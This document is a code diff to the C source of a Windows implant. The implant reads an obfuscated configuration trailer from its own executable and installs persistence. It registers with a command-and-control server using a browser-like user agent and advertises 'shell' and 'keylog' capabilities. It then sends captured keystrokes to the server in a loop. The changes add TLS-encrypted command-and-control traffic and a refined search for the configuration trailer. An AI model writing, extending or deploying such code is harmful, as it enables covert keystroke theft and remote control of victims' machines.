@@ -70,9 +70,16 @@ static char* decrypt_cfg(const char* exePath) {
     if (sz.QuadPart < 16 || sz.QuadPart > (LONGLONG)512 * 1024 * 1024) { CloseHandle(h); return NULL; }
     char* buf = (char*)malloc((SIZE_T)sz.QuadPart);
     DWORD rd = 0; ReadFile(h, buf, (DWORD)sz.QuadPart, &rd, NULL); CloseHandle(h);
+    if (rd < 12) { free(buf); return NULL; }
 
+    // scan last 8KB backward so a double-wrapped PE hits the newest trailer
     char* p = NULL;
-    for (DWORD i = 0; i + 12 <= rd; i++) { if (memcmp(buf + i, MAGIC_OBF, 8) == 0) { p = buf + i; break; } }
+    DWORD window = rd > 8192 ? 8192 : rd;
+    for (DWORD off = 8; off <= window; off++) {
+        DWORD i = rd - off;
+        if (i + 12 > rd) continue;
+        if (memcmp(buf + i, MAGIC_OBF, 8) == 0) { p = buf + i; break; }
+    }
     if (!p) { free(buf); return NULL; }
     unsigned char* lp = (unsigned char*)(p + 8);
     unsigned int len = lp[0] | (lp[1] << 8) | (lp[2] << 16) | (lp[3] << 24);
@@ -93,21 +100,27 @@ static char* jval(const char* j, const char* key, char* out, int cap) {
 }
 
 // ---- HTTP POST via runtime WinHTTP, benign UA ----
-static void http_post(const char* host, const char* port, const char* path, const char* body) {
-    wchar_t wh[128], wp[64], wb[2048];
+#ifndef WINHTTP_FLAG_SECURE
+#define WINHTTP_FLAG_SECURE 0x00800000
+#endif
+
+static void http_post(const char* host, const char* port, const char* path, const char* body, BOOL use_tls) {
+    wchar_t wh[128], wp[64];
     MultiByteToWideChar(CP_ACP, 0, host, -1, wh, 128);
     MultiByteToWideChar(CP_ACP, 0, path, -1, wp, 64);
-    MultiByteToWideChar(CP_ACP, 0, body, -1, wb, 2048);
     void* sess = f_open(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", 0, NULL, NULL, 0);
     if (!sess) return;
-    void* conn = f_connect(sess, wh, (INTERNET_PORT)atoi(port), 0);
+    INTERNET_PORT nport = (INTERNET_PORT)atoi(port);
+    if (!nport) nport = use_tls ? 443 : 80;
+    void* conn = f_connect(sess, wh, nport, 0);
     if (conn) {
-        void* req = f_openreq(conn, L"POST", wp, NULL, NULL, NULL, 0, 0);
+        DWORD flags = use_tls ? WINHTTP_FLAG_SECURE : 0;
+        void* req = f_openreq(conn, L"POST", wp, NULL, NULL, NULL, flags, 0);
         if (req) {
             DWORD blen = (DWORD)lstrlenA(body);
             f_sendreq(req, L"Content-Type: application/json", -1, (void*)body, blen, blen, 0);
             char tmp[16]; DWORD got = 0;
-            if (f_recv) f_recv(req, tmp, sizeof(tmp), &got);   // drain status
+            if (f_recv) f_recv(req, tmp, sizeof(tmp), &got);
             f_closeh(req);
         }
         f_closeh(conn);
@@ -180,15 +193,17 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
     char* cfg = decrypt_cfg(exe);
     if (!cfg) return 0;                       // unconfigured sample: silent exit
     char host[128] = {0}, port[16] = {0}, tmp[64];
-    int sleep_s = 60, jit = 10; BOOL persist_on = FALSE;
+    int sleep_s = 60, jit = 10; BOOL persist_on = FALSE, use_tls = FALSE;
     jval(cfg, "\"c2_host\"", host, sizeof(host));
     jval(cfg, "\"c2_port\"", port, sizeof(port));
+    if (jval(cfg, "\"use_tls\"", tmp, sizeof(tmp))) use_tls = (lstrcmpA(tmp, "true") == 0);
     if (jval(cfg, "\"sleep_interval\"", tmp, sizeof(tmp))) sleep_s = atoi(tmp);
     if (jval(cfg, "\"jitter\"", tmp, sizeof(tmp))) jit = atoi(tmp);
     if (jval(cfg, "\"persistence\"", tmp, sizeof(tmp))) persist_on = (lstrcmpA(tmp, "true") == 0);
     free(cfg);
     if (!host[0]) return 0;
-    if (!port[0]) lstrcpyA(port, "8080");
+    if (!port[0]) lstrcpyA(port, use_tls ? "443" : "80");
+    if (lstrcmpA(port, "443") == 0) use_tls = TRUE;
 
     if (persist_on) persist(exe);
 
@@ -201,7 +216,7 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
         "\"os_version\":\"Windows\",\"arch\":\"x64\",\"pid\":%lu,\"privileges\":%d,"
         "\"hw_id\":\"%08X\",\"build_version\":2,\"capabilities\":[\"shell\",\"keylog\"]}",
         hostn, user, GetCurrentProcessId(), is_admin() ? 1 : 0, hwid);
-    http_post(host, port, "/agent", body);
+    http_post(host, port, "/agent", body, use_tls);
 
     srand(GetTickCount() ^ (DWORD)(DWORD_PTR)exe);
     for (;;) {
@@ -211,7 +226,7 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
         keys[0] = 0; keylog_tick(keys, sizeof(keys));
         if (!keys[0]) continue;
         wsprintfA(body, "{\"type\":\"keystrokes\",\"hw_id\":\"%08X\",\"data\":\"%s\"}", hwid, keys);
-        http_post(host, port, "/beacon", body);
+        http_post(host, port, "/beacon", body, use_tls);
     }
     return 0;
 }
